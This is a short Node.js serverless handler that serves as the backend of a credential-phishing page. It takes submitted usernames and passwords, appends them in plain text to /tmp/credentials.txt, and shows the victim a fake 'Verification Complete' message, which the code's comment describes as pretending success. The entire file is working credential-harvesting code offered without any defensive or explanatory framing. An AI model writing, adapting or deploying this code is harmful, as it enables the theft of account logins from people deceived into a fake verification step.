const fs = require('fs');
const path = require('path');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Only POST requests are allowed' });
    }

    const { username, password } = req.body;

    // Define the path to the temporary file
    const filePath = path.join('/tmp', 'credentials.txt');

    // Log the credentials to the temporary file
    const logEntry = `Username: ${username}, Password: ${password}\n`;
    fs.appendFileSync(filePath, logEntry);

    // Respond to the user (pretend it was successful)
    res.send('<h2>Verification Complete</h2><p>Your account has been verified successfully.</p>');
};